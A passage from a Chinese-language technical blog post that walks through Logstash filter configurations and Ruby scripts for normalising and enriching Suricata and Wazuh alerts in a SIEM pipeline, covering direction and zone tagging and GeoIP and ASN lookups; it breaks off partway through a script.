<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][tls] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            uppercase =&gt; [</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span></span><br><span class="line">            ]</span><br><span class="line">            split =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;:&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            join =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            copy =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;[related][hash]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-normalized-alarm-from-siem"><a href="#1-2-normalized-alarm-from-siem" class="headerlink" title="1.2 normalized-alarm_from_siem"></a>1.2 normalized-alarm_from_siem</h4><p>​        针对alarm事件进行标准化，也就是SIEM发出的数据。参考上图中红色线所示部分</p>
<h5 id="1-2-1-normalized-alarm"><a href="#1-2-1-normalized-alarm" class="headerlink" title="1.2.1 normalized-alarm"></a>1.2.1 normalized-alarm</h5><p>​        通用alarm事件标准化配置。</p>
<h6 id="Logstash-Config-7"><a href="#Logstash-Config-7" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/70_normalized-siem.conf">normalized-alarm.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    date &#123;</span><br><span class="line">        match =&gt; [<span class="string">&quot;timestamp&quot;</span>, <span class="string">&quot;ISO8601&quot;</span>]</span><br><span class="line">        target =&gt; <span class="string">&quot;timestamp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        rename =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[data][source]&quot;</span> =&gt; <span class="string">&quot;source&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][destination]&quot;</span> =&gt; <span class="string">&quot;destination&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][network]&quot;</span> =&gt; <span class="string">&quot;network&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;[data][event]&quot;</span> =&gt; <span class="string">&quot;event&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][fileset]&quot;</span> =&gt; <span class="string">&quot;fileset&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;[data][http]&quot;</span> =&gt; <span class="string">&quot;http&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][url]&quot;</span> =&gt; <span class="string">&quot;url&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][user_agent]&quot;</span> =&gt; <span class="string">&quot;user_agent&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[data][related]&quot;</span> =&gt; <span class="string">&quot;related&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][threat]&quot;</span> =&gt; <span class="string">&quot;threat&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[rule][groups]&quot;</span> =&gt; <span class="string">&quot;[rule][ruleset]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        convert =&gt; &#123;</span><br><span class="line">            <span class="comment">#&quot;[agent][id]&quot; =&gt; &quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[event][severity]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[related][rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[network][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[network][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[source][port]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[source][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[source][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[destination][port]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[destination][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[destination][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[http][response][status_code]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[http][response][body][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        remove_field =&gt; [</span><br><span class="line">            <span class="string">&quot;beat&quot;</span>, <span class="string">&quot;input_type&quot;</span>, <span class="string">&quot;tags&quot;</span>, <span class="string">&quot;count&quot;</span>, <span class="string">&quot;@version&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ecs&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;offset&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;predecoder&quot;</span>,</span><br><span class="line">            <span class="string">&quot;decoder&quot;</span>, <span class="string">&quot;[data][rule]&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        copy =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[rule][description]&quot;</span> =&gt; <span class="string">&quot;[rule][name]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;previous_output&quot;</span> =&gt; <span class="string">&quot;[related][event][log]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                src_ip = event.get(&#x27;[source][ip]&#x27;)</span></span><br><span class="line"><span class="string">                dst_ip = event.get(&#x27;[destination][ip]&#x27;)</span></span><br><span class="line"><span class="string">                src_port = event.get(&#x27;[source][port]&#x27;).to_s</span></span><br><span class="line"><span class="string">                dst_port = event.get(&#x27;[destination][port]&#x27;).to_s</span></span><br><span class="line"><span class="string">                rule_name = event.get(&#x27;[related][rule][name]&#x27;)[0].to_s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                rule_description = src_ip + &#x27;:&#x27; + src_port + &#x27; -&gt; &#x27; + dst_ip + &#x27;:&#x27; + dst_port + &#x27; -&gt; &#x27; + rule_name</span></span><br><span class="line"><span class="string">                event.set(&#x27;[rule][description]&#x27;, rule_description)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if event.get(&#x27;[related][rule][id]&#x27;) then</span></span><br><span class="line"><span class="string">                    sid = event.get(&#x27;[related][rule][id]&#x27;)[0]</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[rule][uuid]&#x27;, sid)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                event.set(&#x27;[rule][category]&#x27;, &#x27;Frequency&#x27;)</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-Enrichment"><a href="#2-Enrichment" class="headerlink" title="2. Enrichment"></a>2. Enrichment</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/enrichment-0.1.png" alt="image-20201208110506481"></p>
<hr>
<h4 id="2-1-enrichment-alert-to-siem"><a href="#2-1-enrichment-alert-to-siem" class="headerlink" title="2.1 enrichment_alert_to_siem"></a>2.1 enrichment_alert_to_siem</h4><p>​        针对alert事件进行丰富化，也就是安全设备发出的原始安全事件。参考上图中蓝色线所示部分</p>
<h5 id="2-1-1-enrichment-alert-direction-for-suricata"><a href="#2-1-1-enrichment-alert-direction-for-suricata" class="headerlink" title="2.1.1 enrichment-alert_direction_for_suricata"></a>2.1.1 enrichment-alert_direction_for_suricata</h5><p>​        由于一些特殊原因，我不得不将<strong>suricata.yaml</strong>配置文件中的<code>EXTERNAL_NET = any</code>。这也导致了部分Suricata告警的误报，毕竟放开了规则的方向这个收敛条件。所以，我利用了Logstash 在数据入库到SIEM之前做了一层过滤。</p>
<h6 id="Logstash-Config-8"><a href="#Logstash-Config-8" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/72_enrichment-alert_direction.conf">enrichment-alert_direction_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [rule][description] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/add_direction.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-1"><a href="#Ruby-Code-1" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/add_direction.rb">enrichment-alert_direction_for_suricata.rb</a></strong><ul>
<li><em>过滤触发规则的IP与规则方向不匹配的安全事件</em></li>
<li><em>增加方向与区域的字段，便于分析人员第一时间识别<strong>内对内</strong>以及<strong>内对外</strong>的告警。</em></li>
</ul>
</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> src_ip <span class="keyword">or</span> <span class="keyword">not</span> dst_ip <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ipaddr_src = IPAddr.new src_ip</span><br><span class="line">    ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sample: alert http $EXTERNAL_NET any -&gt; $HOME_NET any</span></span><br><span class="line">    rule = event.get(<span class="string">&quot;[rule][description]&quot;</span>)</span><br><span class="line">    src_direction = rule.split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    dst_direction = rule.split(<span class="string">&quot; &quot;</span>)[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    src_private = ipaddr_src.private?()</span><br><span class="line">    dst_private = ipaddr_dst.private?()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> event.get(<span class="string">&quot;provider&quot;</span>) == <span class="string">&quot;Suricata&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> ( src_private ) <span class="keyword">and</span> ( src_direction == <span class="string">&quot;$EXTERNAL_NET&quot;</span> ) <span class="keyword">then</span></span><br><span class="line">            event.cancel</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( dst_private ) <span class="keyword">and</span> ( dst_direction == <span class="string">&quot;$EXTERNAL_NET&quot;</span> ) <span class="keyword">then</span></span><br><span class="line">            event.cancel</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> src_private <span class="keyword">and</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;outbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;internal&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> src_private <span class="keyword">and</span> <span class="keyword">not</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;outbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;internal&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> src_private <span class="keyword">and</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;inbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;external&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        direction = <span class="string">&quot;inbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;external&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.set(<span class="string">&quot;[network][direction]&quot;</span>, direction)</span><br><span class="line">    event.set(<span class="string">&quot;[network][zone]&quot;</span>, zone)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-1-2-enrichment-related-domain-for-suricata"><a href="#2-1-2-enrichment-related-domain-for-suricata" class="headerlink" title="2.1.2 enrichment_related_domain_for_suricata"></a>2.1.2 enrichment_related_domain_for_suricata</h5><p>​        为了便于后期做关联分析，增加了攻击者与域名的关联字段。</p>
<h6 id="Logstash-Config-9"><a href="#Logstash-Config-9" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/72_enrichment-related_domain.conf">enrichment_related_domain_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [url][domain] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                source_ip = event.get(&#x27;[source][ip]&#x27;)</span></span><br><span class="line"><span class="string">                url_domain = event.get(&#x27;[url][domain]&#x27;)</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][domain]&#x27;, [source_ip, url_domain])</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-1-3-add-geo-private-ip"><a href="#2-1-3-add-geo-private-ip" class="headerlink" title="2.1.3 add_geo-private_ip"></a>2.1.3 add_geo-private_ip</h5><p>​        为内网IP增加地理位置标示，主要是为了<strong>Dashboard</strong>展示的时候可以看到资产在地图上的坐标。<strong>地图炮？BIUBIUBIU？</strong>😂。由于不是外网IP没办法加载GeoIP进行匹配，这里使用了<strong>Translate</strong>这个插件来进行配置。</p>
<h6 id="Logstash-Conifg"><a href="#Logstash-Conifg" class="headerlink" title="Logstash Conifg"></a><strong>Logstash Conifg</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/70_enrichment-geo_private_ip.conf">add-geo_private_ip.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_geo.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[source][geo]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_asn.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[source][as]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;translation_geo&quot;</span>, <span class="string">&quot;translation_as&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_geo.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[destination][geo]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_asn.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[destination][as]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;translation_geo&quot;</span>, <span class="string">&quot;translation_as&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Yaml"><a href="#Yaml" class="headerlink" title="Yaml"></a><strong>Yaml</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/private_ip_geo.yml">private_ip_geo.yml</a></strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;192.168.199.\d+&#x27;</span><span class="string">:</span> <span class="string">&#x27;&#123;&quot;location&quot;:&#123;&quot;lat&quot;:45.8491,&quot;lon&quot;:-119.7143&#125;,&quot;country_name&quot;:&quot;China&quot;,&quot;country_iso_code&quot;:&quot;CN&quot;,&quot;region_name&quot;:&quot;Jiangsu&quot;,&quot;region_iso_code&quot;:&quot;JS&quot;,&quot;city_name&quot;:&quot;Nanjing&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/private_ip_asn.yml">private_ip_asn.yml</a></strong></li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;192.168.199.\d+&#x27;</span><span class="string">:</span> <span class="string">&#x27;&#123;&quot;number&quot;:4134,&quot;organization.name&quot;:&quot;CHINANET-BACKBONE&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a><strong>示例</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/add-geo_ip-2.png" alt="image-20201209110617996"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/add-geo_ip-1.png" alt="image-20201208153642680"></p>
<hr>
<h5 id="2-1-4-add-geo-public-ip"><a href="#2-1-4-add-geo-public-ip" class="headerlink" title="2.1.4 add_geo-public_ip"></a>2.1.4 add_geo-public_ip</h5><p>​    外网IP就比较好搞定了直接加载GeoIP数据即可。</p>
<h6 id="Logstash-Conifg-1"><a href="#Logstash-Conifg-1" class="headerlink" title="Logstash Conifg"></a><strong>Logstash Conifg</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/71_enrichment-geo_public_ip.conf">add-geo_public_ip.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> ! [<span class="built_in">source</span>][geo] &#123;</span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[source][geo]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;city_name&quot;</span>, <span class="string">&quot;country_name&quot;</span>, <span class="string">&quot;country_code2&quot;</span>, <span class="string">&quot;region_name&quot;</span>, <span class="string">&quot;region_code&quot;</span>, <span class="string">&quot;location&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-City.mmdb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[source][as]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;autonomous_system_organization&quot;</span>, <span class="string">&quot;autonomous_system_number&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-ASN.mmdb&quot;</span></span><br><span class="line">            default_database_type =&gt; <span class="string">&quot;ASN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> ! [destination][geo] &#123;</span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[destination][geo]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;city_name&quot;</span>, <span class="string">&quot;country_name&quot;</span>, <span class="string">&quot;country_code2&quot;</span>, <span class="string">&quot;region_name&quot;</span>, <span class="string">&quot;region_code&quot;</span>, <span class="string">&quot;location&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-City.mmdb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        geoip &#123;</span><br><span class="line">            <span class="built_in">source</span> =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">            target =&gt; <span class="string">&quot;[destination][as]&quot;</span></span><br><span class="line">            fields =&gt; [<span class="string">&quot;autonomous_system_organization&quot;</span>, <span class="string">&quot;autonomous_system_number&quot;</span>]</span><br><span class="line">            database =&gt; <span class="string">&quot;/etc/logstash/GeoLite2-ASN.mmdb&quot;</span></span><br><span class="line">            default_database_type =&gt; <span class="string">&quot;ASN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][geo][country_code2]&quot;</span>, <span class="string">&quot;[source][geo][country_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][geo][region_code]&quot;</span>, <span class="string">&quot;[source][geo][region_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][as][asn]&quot;</span>, <span class="string">&quot;[source][as][number]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[source][as][as_org]&quot;</span>, <span class="string">&quot;[source][as][organization.name]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][geo][country_code2]&quot;</span>, <span class="string">&quot;[destination][geo][country_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][geo][region_code]&quot;</span>, <span class="string">&quot;[destination][geo][region_iso_code]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][as][asn]&quot;</span>, <span class="string">&quot;[destination][as][number]&quot;</span>]</span><br><span class="line">        rename =&gt; [<span class="string">&quot;[destination][as][as_org]&quot;</span>, <span class="string">&quot;[destination][as][organization.name]&quot;</span>]</span><br><span class="line"></span><br><span class="line">        remove_tag =&gt; [ <span class="string">&quot;_geoip_lookup_failure&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-2-enrichment-alarm-from-siem"><a href="#2-2-enrichment-alarm-from-siem" class="headerlink" title="2.2 enrichment-alarm_from_siem"></a>2.2 enrichment-alarm_from_siem</h4><p>​        针对alarm事件进行丰富化，也就是SIEM发出的数据。上图中红色线所示部分</p>
<h5 id="2-2-1-enrichment-related-event-id-for-wazuh"><a href="#2-2-1-enrichment-related-event-id-for-wazuh" class="headerlink" title="2.2.1 enrichment-related_event_id_for_wazuh"></a>2.2.1 enrichment-related_event_id_for_wazuh</h5><p>​    为SIEM告警增加了<strong>Hunting</strong>的功能，通过该功能可直接溯源到触发alarm的所有alert事件。</p>
<h6 id="Logstash-Config-10"><a href="#Logstash-Config-10" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-related.conf"><strong>enrichment-related_event_id_for_wazuh.conf</strong></a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> and [related][event][<span class="built_in">log</span>] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/add_related_event_id.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-2"><a href="#Ruby-Code-2" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/add_related_event_id.rb">enrichment-related_event_id_for_wazuh.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;json&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@pattern</span> = <span class="regexp">/(?:\\n)?\w+ \d+ \d+:\d+:\d+ logstash NORMALIZED\[-\]: /</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    event_id = []</span><br><span class="line">    rule_id = []</span><br><span class="line">    rule_name = []</span><br><span class="line">    event_log = event.get(<span class="string">&#x27;[related][event][log]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    atomic_rules = event_log.split(<span class="variable">@pattern</span>)[<span class="number">1</span> .. -<span class="number">1</span>]</span><br><span class="line">    <span 